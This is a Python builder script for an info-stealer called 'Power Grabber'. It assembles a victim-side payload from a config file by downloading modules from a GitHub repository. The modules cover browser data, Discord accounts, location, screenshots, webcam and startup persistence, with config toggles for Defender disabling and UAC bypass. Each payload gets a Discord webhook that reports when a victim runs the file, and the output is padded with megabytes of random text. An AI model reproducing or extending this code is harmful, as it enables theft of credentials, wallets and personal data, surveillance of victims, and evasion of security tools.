import requests
import random
import os
with open('config.txt', 'r') as file:
    config = file.read()
def get_enabled_features(config_content):
    enabled_features = []
    webhook_url = ""
    filename = ""
    terms = [
        'Annoy-Victim', 'Anti-VM', 'Browser-Info', 'Clipboard', 'Discord-Info',
        'Discord-Injection', 'Disable-Defender', 'File-Name', 'Games-Info', 'Kill-Defender',
        "Email-Addresses", 'Exact-location', 'Vulnerable-port-creation', 'Roblox-Account', 'Screenshot', 'Self-destruction',
        'System-Info', 'UAC-Bypass', 'Wallets', 'Watch-Dog', 'Webcam',
        'Webhook', 'Filepumper-Value', 'Ping'
    ]
    feature_values = {}
    for term in terms:
        try:
            value = config_content.split(f'{term}: ')[1].split('\n')[0].strip('"').lower()
            if term == 'Webhook':
                webhook_url = value
            elif term == 'File-Name':
                filename = value
            elif term == 'Ping' or term == 'Filepumper-Value':
                feature_values[term] = value
            elif value in ['true', '1', 'yes', 'on']:
                enabled_features.append(term)
        except:
            continue
    return enabled_features, feature_values, webhook_url, filename
features, values, webhook, filename = get_enabled_features(config)
with open('config.txt', 'r') as config_file:
    for line in config_file:
        if line.startswith("Filepumper-Value:"):
            filepumper_value = line.split("Filepumper-Value:")[1].strip()
            break
with open(filename, 'w', encoding='utf-8') as file:
    if filepumper_value.lower() != "none":
        random_comment = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5*1024*1024))
        file.write(f"# {random_comment}")
    if filepumper_value == "5":
        file.write(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5*1024*1024)))
    elif filepumper_value == "10":
        file.write(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10*1024*1024)))
    elif filepumper_value.lower() == "none":
        pass
with open('config.txt', 'r') as config_file:
    for line in config_file:
        if line.startswith("Webhook:"):
            webhook_url = line.split("Webhook:")[1].strip()
            break
    for line in config_file:
        if line.startswith("Ping:"):
            ping_value = line.split("Ping:")[1].strip()
            break
ping_message = ""
ping_code = ""
if ping_value == "Here":
    ping_message = "'@here'"
elif ping_value == "Everyone":
    ping_message = "'@everyone'"
if ping_message:
    ping_code = f"""
import requests
import socket
hostname = socket.gethostname()
data = {{
    "content": {ping_message},
    "embeds": [
        {{
            "title": "Power Grabber Notification",
            "description": f"{{hostname}} ran the file! Grabbing info on the victim...",
            "color": 0x8B0000
        }}
    ]
}}
response = requests.post(webhook_url, json=data)
if response.status_code == 204:
    pass
else:
    pass
"""
combined_code = ""
if 'Anti-VM' in features:
    vm_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/vm-check.py').text.strip()
    combined_code += vm_code + "\n" if vm_code else ""
if 'Annoy-Victim' in features:
    annoy_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Annoy.py').text.strip()
    combined_code += annoy_code + "\n" if annoy_code else ""
if 'Clipboard' in features:
    clipboard_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Clipboard.py').text.strip()
    combined_code += clipboard_code + "\n" if clipboard_code else ""
if 'Discord-Info' in features:
    discord_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Discord-Info.py').text.strip()
    combined_code += discord_code + "\n" if discord_code else ""
if 'Exact-location' in features:
    location_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Location.py').text.strip()
    combined_code += location_code + "\n" if location_code else ""
if 'Obfuscate' in features:
    obfuscate_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Obfuscate.py').text.strip()
    combined_code += obfuscate_code + "\n" if obfuscate_code else ""
if 'Screenshot' in features:
    screenshot_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Screenshot.py').text.strip()
    combined_code += screenshot_code + "\n" if screenshot_code else ""
if 'Self-destruction' in features:
    destruct_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Self-destruct.py').text.strip()
    combined_code += destruct_code + "\n" if destruct_code else ""
if 'System-Info' in features:
    system_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/System-Info.py').text.strip()
    combined_code += system_code + "\n" if system_code else ""
Startup_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Startup.py').text.strip()
combined_code += Startup_code + "\n" if Startup_code else ""
if 'Vulnerable-port-creation' in features:
    port_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Port.py').text.strip()
    combined_code += port_code + "\n" if port_code else ""
if 'Webcam' in features:
    webcam_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Webcam.py').text.strip()
    combined_code += webcam_code + "\n" if webcam_code else ""
if 'Browser-Info' in features:
    browser_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Browsers.py').text.strip()
    combined_code += browser_code + "\n" if browser_code else ""
final_code = f"\nwebhook_url = {webhook_url}\n" + ping_code + "\n".join(filter(None, combined_code.splitlines()))
with open(filename, 'a', encoding='utf-8') as grabber_file:
    grabber_file.write(final_code)
